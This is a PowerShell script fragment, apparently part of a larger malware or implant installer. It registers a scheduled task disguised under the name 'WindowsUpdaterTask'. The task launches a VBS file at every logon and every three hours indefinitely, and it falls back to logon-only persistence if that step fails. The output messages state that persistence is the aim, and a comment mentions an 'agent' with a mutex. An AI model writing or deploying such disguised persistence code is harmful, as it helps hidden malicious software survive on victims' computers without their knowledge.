# ---- 3. Scheduled task using PowerShell cmdlets ----
$taskName = "WindowsUpdaterTask"
$taskCreated = $false

# Delete existing task if any
try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

# Create the action (runs VBS)
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""

# Trigger 1: At logon
$logonTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME

# Trigger 2: Every 3 hours, starting from now, repeating indefinitely
$repeatTrigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Hours 3) -RepetitionDuration ([TimeSpan]::MaxValue)

# Combine triggers
$triggers = @($logonTrigger, $repeatTrigger)

# Principal (run as current user, only when logged on)
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited

# Settings (allow multiple instances? Your agent has mutex, so keep default)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew

# Register the task
try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Principal $principal -Settings $settings -Force -ErrorAction Stop
    $taskCreated = $true
    Write-Output "✅ Task '$taskName' created with logon + every-3-hour triggers (PowerShell cmdlets)."
} catch {
    Write-Output "❌ PowerShell cmdlet failed: $($_.Exception.Message)"
    
    # Fallback: create a simple logon-only task (better than nothing)
    try {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        $simpleTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $simpleTrigger -Principal $principal -Settings $settings -Force
        $taskCreated = $true
        Write-Output "⚠️ Repetition failed, but logon persistence installed (runs once per boot)."
    } catch {
        Write-Output "❌ Fallback also failed: $($_.Exception.Message)"
    }
}

if (-not $taskCreated) {
    Write-Output "❌ Persistence failed. Run PowerShell as administrator or check Task Scheduler service."
}
